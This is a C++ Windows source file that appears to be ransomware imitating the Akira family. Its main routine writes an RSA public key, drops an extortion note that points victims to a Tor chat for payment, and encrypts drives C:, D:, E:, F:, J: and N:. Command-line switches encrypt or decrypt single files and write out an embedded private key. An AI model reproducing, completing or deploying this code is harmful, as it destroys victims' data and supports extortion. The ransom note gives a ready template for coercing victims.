#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <stdio.h>
#include <string.h>
#include "framework.h"
#include "mdl.hpp"
#include <shellapi.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;
namespace fs = std::filesystem;

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	int    argc = 0;
	LPSTR* argv = CommandLineToArgvA(GetCommandLineA(), &argc);
	if ((argc > 1) && ((*argv[1] == '-') || (*argv[1] == '/')))
	{
		if (_stricmp("e", argv[1] + 1) == 0)
		{
			printf("RansomFile returned %d\n", RansomFile(argv[2]));
		}
		else if (_stricmp("d", argv[1] + 1) == 0)
		{
			printf("DeRansomFile returned %d\n", DeRansomFile(argv[2]));
		}
		else if (_stricmp("p", argv[1] + 1) == 0)
		{
			string private_msg = R"(-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDGXSY1w76Bo51E
FmsOFqPvPXno10AwzyfimFIUqvOkbLTFyMNw1qgx8i0gsuILh4ONzKaX34W1KyI/
UR2VMzYKkLIVYTjsWaeQWKw5XZ+rH3MKmwmpRANoxn7IBDLS0Z9wN87Z1G3Jdvtz
uaxhyAlJcbVvaRF9vcOD2sE5T1Saed2JxUnV1MYzZ+pJoHP38SCHq7OWEETdWXxX
6SiVah80VpE3pmPQFH+0rllbYXL86Sxsa8pPZKmwRf/p8oGOKPmqZyiF7v/eciQR
wqCPQ1MK1TJgPYq61y7QEnk/02+Z7R/GCajQztTEMuyHkv2peYBYUa8UhwtMFVEK
ByYwFvXxAgMBAAECggEACHWyinp1pnu+2keGe0xV438gsuBzOWGsVsqePYlo6KtG
LmU4iJhvBepJKGrYnxtBbgu7UyDSR/618DNaaqGLfXncTnMeBV5xegN+HNg0Vgz6
UAp6qABhkNdeUtNzA3CzNwr6RGn94Ki1YqMZifYJB1vVHBJED7PHIdlzgiky93+F
y6FXfCdXarkzMA0i58yho9CDqagJbeS5pEgIUDDqqTdYToo06NJPAnIUdsLVZTON
rQUIjceFL+iaVdhGQgmz9zt70DTomMhIrEFom2LgMzvpz4bJ9nN2DSk5qLVL5St6
MT4QhCxu9PPSlXz2Ir0BL1FAwFUbelOsivGxbdmQwQKBgQDnwjQrLDkaxE/f6xwF
rtdWzjW6hHJtSrlfzCG3+VLyJWHKErL3o+jzIbC3FkVQ+KEPeeEJ2jy1sQ8PpmMO
VJAzefebwrrkawgP9utXDVSYt2r8YHC9pJgjw+DmP2H9zTo4kz3pjP14NLoITIyj
+peuv+NgU5bpOmpbRbKGEdoDOQKBgQDbHLwoU2+PxGa57aVobfaTjXuELn7gR8fQkira
P8mVaMcjVmXBM47/FW9vMhP9mhSEM0XtFXcZOkFrNeoSBTjLZkwceZOiCk30Rxg+
vMS030/x6YYkdv9/k/ajrLq0QXpGEURo6yW2c0Rjq1YhBO98m3Oj8/ugxD+Pksx+
o/oZJzbweQKBgDAjwcxZ8j6iGmlLn9V6XNZ2HOjyTAZxqBHDCBn72wPbSfW8bppL
3L5r+BX/tUQ9cM8TJPBz+XpQHe3FRPwcCpv2sL0U9NcveExAoN/DMBhMuRdVPPXX
c5ayQEvzTHp4n6hSxWB23cuTQDUrGWeSTOGKkENY+ZbWgHMXBh8dJCjZAoGBALN7
0lVmI1itFUjwdjIZAYbUun0IaT3nDrJzzfjpn1Y/C5M7XMNvF50KdH2knXG9XmZa
0viDU9syis7AIEndPjOFE34E2t5i7mVV0/wlgSM0m4F7SMeEuOBSOY42pKaItnUL
ShUuTrMmQqNBm7uCyzNeRJzopPhC0+hZAiFgkgxhAoGAKF0X9jrDR9ikM8+vf99e
p0Yj3PYOuHd0x9bY0lhUCmo7EFb78fGe6uAZUiKx+jVzDoR26j9xAmll54/mNDhH
mb/mxVWKGYyCUvWVQYijKjrBKWk3oHdoXdS8Q2iIj4YH6qVowzJNNjoELq73bYOv
q+P8nRVzEPUqf4iqmc693pY=
-----END PRIVATE KEY-----
)";
			create_file("C:\\temp\\private.pem", private_msg);
		}
		else
		{

		}
		exit(0);
	}
	else {
		//code
		string public_msg = R"(-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxl0mNcO+gaOdRBZrDhaj
7z156NdAMM8n4phSFKrzpGy0xcjDcNaoMfItILLiC4eDjcyml9+FtSsiP1EdlTM2
CpCyFWE47FmnkFisOV2fqx9zCpsJqUQDaMZ+yAQy0tGfcDfO2dRtyXb7c7msYcgJ
SXG1b2kRfb3Dg9rBOU9UmnndicVJ1dTGM2fqSaBz9/Egh6uzlhBE3Vl8V+kolWof
NFaRN6Zj0BR/tK5ZW2Fy/OksbGvKT2SpsEX/6fKBjij5qmcohe7/3nIkEcKgj0NT
CtUyYD2Kutcu0BJ5P9Nvme0fxgmo0M7UxDLsh5L9qXmAWFGvFIcLTBVRCgcmMBb1
8QIDAQAB
-----END PUBLIC KEY-----
)";
		string msg_akira = R"(Hi friends,

Whatever who you are and what your title is if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption.

Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to know:

1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank & income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal.
2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. If you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them - in this case we won't be able to help.
3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we've managed to detect and used in order to get into, identify backup solutions and upload your data.
4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog -.
5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us.

If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:

1. Install TOR Browser to get access to our chat room - hxxps://www.torproject.org/download/.
2. Paste this link https://akirawefwuofgaegruyraeggf4r3qh347iuh7yqoi43f78h34fq7i2d3i2d34rf2f49y.onion.
3. Use this code dhf45gd4fg654rt8hgfhrt61hdvs64961vs5a to log into our chat.

Keep in mind that the faster you will get in touch, the less damage we cause.)";
		create_file("C:\\ProgramData\\loc.log", public_msg);
		create_file("С:\\akira_readme.txt", msg_akira);
		encrypt_folder_ps("C:\\");
		encrypt_folder_ps("D:\\");
		encrypt_folder_ps("F:\\");
		encrypt_folder_ps("E:\\");
		encrypt_folder_ps("J:\\");
		encrypt_folder_ps("N:\\");
	}
    return 0;
}